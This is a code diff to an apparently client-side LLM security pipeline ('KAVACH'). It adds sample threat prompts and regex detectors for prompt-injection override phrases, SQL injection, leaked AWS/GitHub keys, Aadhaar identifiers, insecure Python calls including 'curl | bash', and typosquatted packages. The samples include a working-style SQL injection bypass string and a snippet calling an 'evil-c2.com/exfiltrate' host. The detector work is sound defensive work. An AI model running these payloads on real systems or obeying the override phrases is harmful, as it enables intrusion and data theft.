@@ -63,6 +63,30 @@ WHERE branch_code = 'MUM-NORTH-04' AND credit_rating > 750;
 Customer Contact Record: +91-9876543210
 Customer Identity: Aadhaar 8492-3819-2049
 Apply strict differential privacy noise perturbation before returning aggregated analytics.`
+    },
+    aadhaar_leak: {
+      name: "Aadhaar Identity Leak (Malformed UID: 123432)",
+      badge: "threat",
+      badgeText: "DPDP SEC 8(3)",
+      text: "your aadhar number is 123432 please confirm identity verification for database export."
+    },
+    secret_leak: {
+      name: "AWS & GitHub Secret Key Leak",
+      badge: "threat",
+      badgeText: "CWE-798",
+      text: "Deploy production cluster using AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE' and GITHUB_TOKEN = 'ghp_1234567890abcdef1234567890abcdef1234'."
+    },
+    sqli_attack: {
+      name: "SQL Injection Authentication Bypass",
+      badge: "threat",
+      badgeText: "CWE-89",
+      text: "SELECT * FROM corporate_banking_ledger WHERE account_id = 'ACC-889' OR '1'='1'; -- AND auth_token = 'bypass'"
+    },
+    pypi_typosquat: {
+      name: "PyPI Supply-Chain Slopsquatting",
+      badge: "threat",
+      badgeText: "CWE-1357",
+      text: "```python\nimport reqeusts, colorma\nresponse = reqeusts.get('https://evil-c2.com/exfiltrate')\n```"
     }
   };
 
@@ -200,16 +224,54 @@ Apply strict differential privacy noise perturbation before returning aggregated
 
     logs.push(`[KAVACH ORCHESTRATOR] Initialized client-side autonomous swarm pipeline.`);
 
-    // Agent 1: Sentinel
+    // Agent 1: Sentinel (Injections, Credentials, SQLi, Malformed Aadhaar)
     let s1Status = "PASSED";
     let s1Summary = "Prompt verified clean. Zero adversarial delimiter injection vectors found.";
-    const s1Thoughts = ["Scanning token entropy and prompt injection delimiters..."];
+    const s1Thoughts = ["Scanning token entropy, prompt injection delimiters, credentials, and identity context..."];
+
+    // 1A. Prompt Injection
     if (/ignore\s+(all\s+)?(previous|prior)\s+instructions|system\s*:\s*you\s+are|dump\s+the\s+encrypted|bypass\s+safety/i.test(inputText)) {
       s1Status = "INTERCEPTED";
       s1Summary = "Intercepted OWASP LLM01 Direct Prompt Injection & System Jailbreak.";
       threats.push({ type: "OWASP_LLM01_JAILBREAK", score: 0.98 });
       s1Thoughts.push("CRITICAL: Adversarial delimiter pattern detected. Containment quarantine enforced.");
     }
+
+    // 1B. SQL Injection (CWE-89)
+    if (/(?:(OR|AND)\s+['"]?1['"]?\s*=\s*['"]?1|UNION\s+(?:ALL\s+)?SELECT|DROP\s+TABLE|admin'--|;\s*--)/i.test(inputText)) {
+      s1Status = "INTERCEPTED";
+      s1Summary = "Intercepted SQL Injection Pattern (CWE-89 Authentication Bypass).";
+      threats.push({ type: "CWE-89_SQL_INJECTION", score: 0.96 });
+      s1Thoughts.push("CRITICAL: SQL Injection pattern intercepted. Database query blocked.");
+    }
+
+    // 1C. Secret & Credential Leaks
+    if (/(AKIA[A-Z0-9]{16,}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|xox[baprs]-[A-Za-z0-9\-]{10,}|sk-[A-Za-z0-9_\-]{16,}|AIza[A-Za-z0-9_\-]{20,}|-----BEGIN (?:RSA|OPENSSH|EC|DSA|PGP)?\s*PRIVATE KEY-----)/.test(inputText)) {
+      s1Status = "INTERCEPTED";
+      s1Summary = "Intercepted High-Entropy Secret / Credential Leak (AWS/GitHub/Private Key).";
+      threats.push({ type: "CREDENTIAL_EXFILTRATION", score: 0.99 });
+      s1Thoughts.push("CRITICAL: Production secret token detected. Revocation alert triggered.");
+    }
+
+    // 1D. Aadhaar Leak / Malformed UID (catches e.g. "your aadhar number is 123432", "aadhaar: 123432")
+    if (/(?:your\s+aad?ha?a?r\s+(?:number\s+)?is|dump\s+aad?ha?a?r|leak\s+aad?ha?a?r)/i.test(inputText)) {
+      s1Status = "INTERCEPTED";
+      s1Summary = "Intercepted Aadhaar Identity Exfiltration Phrase (DPDP 2023 Sec 8(3)).";
+      threats.push({ type: "AADHAAR_EXFILTRATION_PHRASE", score: 0.96 });
+      s1Thoughts.push("CRITICAL DPDP 2023 VIOLATION: Unauthorized Aadhaar exfiltration attempt.");
+    } else {
+      const aadhaarAssign = /(?:aad?ha?a?r|uid)\s*(?:number|no\.?|id|card)?\s*(?:is|:|=|\s)\s*([0-9\s-]{4,20})/i.exec(inputText);
+      if (aadhaarAssign) {
+        const digits = aadhaarAssign[1].replace(/\D/g, "");
+        if (digits.length !== 12) {
+          s1Status = "INTERCEPTED";
+          s1Summary = `Intercepted Malformed/Leaked Aadhaar UID (${aadhaarAssign[1].trim()}).`;
+          threats.push({ type: "MALFORMED_AADHAAR_LEAK", detail: `Aadhaar UID '${aadhaarAssign[1].trim()}' DPDP Sec 8(3) violation` });
+          s1Thoughts.push(`CRITICAL: Malformed Aadhaar '${aadhaarAssign[1].trim()}' in prompt context quarantined.`);
+        }
+      }
+    }
+
     const s1Lat = +(Math.random() * 0.8 + 1.2).toFixed(2);
     agentSteps.push({
       agent_id: "sentinel_gate",
@@ -221,17 +283,23 @@ Apply strict differential privacy noise perturbation before returning aggregated
       telemetry: { threats_count: threats.length }
     });
 
-    // Agent 2: AST Guard
+    // Agent 2: AST Guard & PyPI Slopsquatting
     let s2Status = "PASSED";
     let s2Summary = "AST analysis clean. No unauthorized subprocess execution.";
-    const s2Thoughts = ["Parsing AST nodes using Abstract Syntax Tree rules..."];
+    const s2Thoughts = ["Parsing AST nodes using Abstract Syntax Tree rules and PyPI supply chain firewall..."];
     if (/yaml\.(unsafe_load|load)|subprocess\.|os\.system|curl.*\|\s*bash/i.test(inputText)) {
       s2Status = "INTERCEPTED";
       s2Summary = "Flagged severe AST vulnerabilities (CWE-502 & CWE-78).";
       threats.push({ type: "CWE-502_DESERIALIZATION", detail: "Insecure YAML Loader" });
       threats.push({ type: "CWE-78_COMMAND_INJECTION", detail: "Arbitrary Subprocess Execution" });
       s2Thoughts.push("CRITICAL: Insecure deserialization & shell invocation intercepted in AST node tree.");
+    } else if (/\b(?:import\s+(?:reqeusts|colorma|urlib3|numpyy|cryptograpy)|from\s+(?:reqeusts|colorma|urlib3)\s+import)\b/i.test(inputText)) {
+      s2Status = "INTERCEPTED";
+      s2Summary = "Intercepted PyPI Package Hallucination & Supply-Chain Slopsquatting (CWE-1357).";
+      threats.push({ type: "PYPI_SLOPSQUATTING_TYPOSQUAT", detail: "Hallucinated / Malicious Dependency" });
+      s2Thoughts.push("CRITICAL: AI Package Hallucination / Dependency Confusion attack blocked.");
     }
+
     const s2Lat = +(Math.random() * 0.9 + 1.4).toFixed(2);
     agentSteps.push({
       agent_id: "ast_guard",
